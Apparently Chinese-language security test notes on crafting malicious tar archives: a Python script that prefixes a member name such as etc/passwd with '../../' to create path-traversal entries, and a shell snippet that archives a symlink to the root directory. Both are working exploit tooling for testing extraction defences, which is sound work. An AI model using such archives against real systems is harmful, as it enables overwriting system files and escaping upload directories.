#### 包含../的tar包

```shell
# 查看tar包的文件，如果包含../会被打印出来
tar -tf test.tar
```

```python
#!/usr/bin/env python3
"""
tar_prefix_modify.py

用途：将指定 tar 归档中的某个成员名（精确匹配）在归档内部名前加上指定前缀，
并写出新的 tar 包。

示例：
  ./tar_prefix_modify.py -p '../../' -m etc/passwd archive.tar
  # 生成 archive.tar-modified.tar （默认不覆盖原文件）

覆盖输出（小心）：
  ./tar_prefix_modify.py -p '../../' -m etc/passwd -o archive.tar --overwrite archive.tar

安全提示（重要）：
 - 此脚本会在归档中写入带 ../ 或绝对路径的条目，解包这些归档可能造成目录穿越或覆盖系统文件。
 - **仅在受控、本地测试环境（容器/VM/临时目录）中使用**，不要在生产系统上解包或分发生成的包。
"""

import argparse
import tarfile
import sys
from pathlib import Path
import shutil
import tempfile
import os

def modify_tar(input_path: Path, member_name: str, prefix: str, output_path: Path, overwrite: bool):
    if output_path.exists() and not overwrite:
        print(f"ERROR: output file {output_path} exists. Use --overwrite to allow replacing.", file=sys.stderr)
        sys.exit(2)

    # determine mode (support gzip if input endswith .gz or user passed .tar.gz output)
    # We'll open input with "r:*" to auto-detect compression, and write output as uncompressed
    # unless output_path endswith .gz -> write gzip.
    out_mode = "w:gz" if str(output_path).endswith(".gz") or str(output_path).endswith(".tgz") else "w"

    # Create temporary output to avoid clobbering on error
    tmp_out = Path(tempfile.mktemp(prefix="tarmod_", dir=str(output_path.parent)))
    try:
        with tarfile.open(str(input_path), "r:*") as src, tarfile.open(str(tmp_out), out_mode) as dst:
            found = False
            for member in src.getmembers():
                # copy metadata
                new_member = tarfile.TarInfo(name=member.name)
                # Copy TarInfo attributes robustly
                for attr in ("mode","uid","gid","uname","gname","size","mtime","type","linkname","devmajor","devminor","paxheaders"):
                    if hasattr(member, attr):
                        try:
                            setattr(new_member, attr, getattr(member, attr))
                        except Exception:
                            pass
                # If this member matches the target exact name, change its name
                if member.name == member_name:
                    new_member.name = prefix + member.name
                    found = True

                # For regular files, we need to copy their fileobj content
                if member.isreg():
                    fobj = src.extractfile(member)
                    if fobj is None:
                        # empty file?
                        dst.addfile(new_member, fileobj=None)
                    else:
                        # ensure size attribute matches content length (use existing size)
                        dst.addfile(new_member, fileobj=fobj)
                else:
                    # For dirs, symlinks, hardlinks, device nodes, etc. just add the header
                    dst.addfile(new_member, fileobj=None)

        # replace or move tmp_out to final output
        if output_path.exists():
            if overwrite:
                output_path.unlink()
            else:
                raise FileExistsError(output_path)
        shutil.move(str(tmp_out), str(output_path))
        print(f"Wrote modified tar to: {output_path}")
        if not found:
            print(f"Warning: member '{member_name}' not found in archive.", file=sys.stderr)
    finally:
        # cleanup tmp if leftover
        try:
            if tmp_out.exists():
                tmp_out.unlink()
        except Exception:
            pass


def main():
    parser = argparse.ArgumentParser(description="Modify tar: prefix a specific member name inside the archive.")
    parser.add_argument("archive", help="input tar archive (tar, tar.gz, tgz supported)")
    parser.add_argument("-m", "--member", required=True, help="exact member name to modify (e.g. etc/passwd)")
    parser.add_argument("-p", "--prefix", required=True, help="prefix to prepend to the member name inside archive (e.g. ../../)")
    parser.add_argument("-o", "--output", help="output tar path (default: <input>-modified.tar or <input>-modified.tar.gz if input was .gz)")
    parser.add_argument("--overwrite", action="store_true", help="allow overwriting output file (USE WITH CARE)")
    args = parser.parse_args()

    input_path = Path(args.archive)
    if not input_path.exists():
        print(f"Archive not found: {input_path}", file=sys.stderr)
        sys.exit(1)

    # decide default output name
    if args.output:
        output_path = Path(args.output)
    else:
        # append -modified before extension
        name = input_path.name
        parent = input_path.parent
        if name.endswith(".tar.gz") or name.endswith(".tgz"):
            base = name.rsplit(".", 2)[0]
            output_path = parent / (base + "-modified.tar.gz")
        elif name.endswith(".gz"):
            base = name.rsplit(".", 1)[0]
            output_path = parent / (base + "-modified.tar")
        else:
            base = name.rsplit(".", 1)[0] if "." in name else name
            output_path = parent / (base + "-modified.tar")

    # Safety prompt (since this can create traversal entries)
    print("=== WARNING ===")
    print("This operation will write a new tar that may contain traversal/absolute path entries.")
    print("Only run and extract the resulting tar in a controlled/test environment (container/VM/tmp).")
    print("================")
    # proceed
    modify_tar(input_path, args.member, args.prefix, output_path, args.overwrite)


if __name__ == "__main__":
    main()

```



#### 包含链接文件tar包

```shell
#!/bin/bash
# 创建指向根目录的软链接

ln -s / screen/root
tar -zcvf 1.tar.gz  screen/root
```

